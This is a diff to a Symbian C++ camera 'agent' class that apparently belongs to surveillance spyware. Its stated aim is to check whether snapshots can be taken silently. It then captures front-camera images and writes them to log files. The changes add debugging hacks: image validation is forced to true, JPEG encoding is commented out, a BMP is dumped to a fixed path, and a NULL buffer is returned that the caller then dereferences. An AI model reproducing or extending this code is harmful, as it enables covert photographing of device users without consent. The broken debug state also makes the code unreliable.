@@ -28,11 +28,12 @@ CAgentCamera::~CAgentCamera()
 	delete iTimer;
 	if(iEngineState!=EEngineNotReady)
 		{
-		iCamera->Release();
 		iCamera->PowerOff();
+		iCamera->Release();
 		}
 	delete iCamera;
 	delete iEncoder;
+	delete iBitmapSave;
 	}
 
 CAgentCamera* CAgentCamera::NewLC(const TDesC8& params)
@@ -78,13 +79,13 @@ void CAgentCamera::ConstructL(const TDesC8& params)
 		return;
 		}
 	iCameraIndex = 1;  //0=rear camera,1=front camera
-	//check if we can silently take snapshots
 	TRAPD(err,iCamera = CCamera::NewL(*this, iCameraIndex));
 	if(err != KErrNone)  //KErrNoMemory, KErrNotSupported, KErrPermissionDenied
 		{
 		iCameraIndex = -1;
 		return;
 		}
+	//check if we can silently take snapshots
 	iCamera->CameraInfo(iInfo);
 	if(!(iInfo.iOptionsSupported & TCameraInfo::EImageCaptureSupported))
 		{
@@ -94,7 +95,9 @@ void CAgentCamera::ConstructL(const TDesC8& params)
 		return;
 		}
 	//retrieve supported image format		
-	iFormat = ImageFormatMax();
+	iFormat = ImageFormatMax();  //TODO: restore when done
+	//iFormat = CCamera::EFormatFbsBitmapColor4K; //TODO: delete when done
+	iBitmapSave = new (ELeave) CFbsBitmap;
 	}
 
 void CAgentCamera::StartAgentCmdL()
@@ -124,8 +127,9 @@ void CAgentCamera::StopAgentCmdL()
 	iTimer->Cancel();
 	if(iEngineState!=EEngineNotReady)
 		{
-		iCamera->Release();
 		iCamera->PowerOff();
+		iCamera->Release();
+		iEngineState = EEngineNotReady;
 		}
 	}
 
@@ -178,8 +182,8 @@ void CAgentCamera::PowerOnComplete(TInt aError)
 		TRAPD(err,iCamera->PrepareImageCaptureL(iFormat,0)); //here, we simply select largest size (index 0)
 		if(err)
 			{
-			iCamera->Release();
 			iCamera->PowerOff();
+			iCamera->Release();
 			iEngineState = EEngineNotReady;
 			}
 		else
@@ -201,12 +205,21 @@ void CAgentCamera::ImageReady(CFbsBitmap *aBitmap, HBufC8 *aData, TInt aError)
 	//save log
 	if(aError == KErrNone)
 		{
-		if(IsValidImage(aBitmap))
+		iBitmapSave->Reset();
+		TInt err = iBitmapSave->Duplicate( aBitmap->Handle() );
+		if(err != KErrNone)
 			{
-			HBufC8* jpegImage = GetImageBufferL(aBitmap);
-			CleanupStack::PushL(jpegImage);
+			iCamera->PowerOff();
+			iCamera->Release();
+			iEngineState = EEngineNotReady;
+			}
+		if(IsValidImage(iBitmapSave))
+			{
+			HBufC8* jpegImage = GetImageBufferL(iBitmapSave);
 			if (jpegImage->Length() > 0)
 				{
+				CleanupStack::PushL(jpegImage);
+							
 				TInt value;
 				RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
 									
@@ -218,14 +231,15 @@ void CAgentCamera::ImageReady(CFbsBitmap *aBitmap, HBufC8 *aData, TInt aError)
 					logFile->CloseLogL();
 					CleanupStack::PopAndDestroy(logFile);
 					}
+
+				CleanupStack::PopAndDestroy(jpegImage);
 				}
-			CleanupStack::PopAndDestroy(jpegImage);
 			}
 		}
 	
 	//release camera
-	iCamera->Release();
 	iCamera->PowerOff();
+	iCamera->Release();
 	iEngineState = EEngineNotReady;
 	}
 
@@ -266,29 +280,41 @@ HBufC8* CAgentCamera::GetImageBufferL(CFbsBitmap* aBitmap)
 			return HBufC8::NewL(0); 
 
 		// set jpeg properties
+		/*
 		CFrameImageData* frameImageData = CFrameImageData::NewL();
 		CleanupStack::PushL(frameImageData);
 		TJpegImageData* imageData = new (ELeave) TJpegImageData();
 		imageData->iSampleScheme  = TJpegImageData::EColor444;
 		imageData->iQualityFactor = 75; // 80 low, set 90 for normal or 100 for high 
 		frameImageData->AppendImageData(imageData);
-				
+		*/		
 		// convert to jpeg synchronously
+		
 		HBufC8* imageBuf = NULL;
+		/*
 		CImageEncoder* encoder  = CImageEncoder::DataNewL(imageBuf,_L8("image/jpeg"),CImageEncoder::EOptionAlwaysThread);
 		CleanupStack::PushL(encoder);
 		TRequestStatus aStatus = KErrNone; 
 		encoder->Convert( &aStatus, *aBitmap, frameImageData );
+		//encoder->Convert( &aStatus, *aBitmap);
 		User::WaitForRequest( aStatus );
 		CleanupStack::PopAndDestroy(encoder);
-				
-		CleanupStack::PopAndDestroy(frameImageData);
+		*/
+		CImageEncoder* encoder = CImageEncoder::FileNewL(iFs, _L("C:\\provasnapshot.bmp"),_L8("image/bmp"),CImageEncoder::EOptionAlwaysThread);
+		CleanupStack::PushL(encoder);
+		TRequestStatus aStatus = KErrNone; 
+		encoder->Convert( &aStatus, *aBitmap);
+		User::WaitForRequest( aStatus );
+		CleanupStack::PopAndDestroy(encoder);
 		
+		//CleanupStack::PopAndDestroy(frameImageData);
 		return imageBuf;
 	}
 
 TBool CAgentCamera::IsValidImage(CFbsBitmap* aImage)
 	{
+	
+	return ETrue; //TODO: delete when done debugging
 	
 	TSize imageSize = aImage->SizeInPixels();
 	TInt height = imageSize.iHeight;  //the number of lines
@@ -347,6 +373,5 @@ TBool CAgentCamera::IsValidImage(CFbsBitmap* aImage)
 	    }
 	return EFalse;
 	}
-
 
     
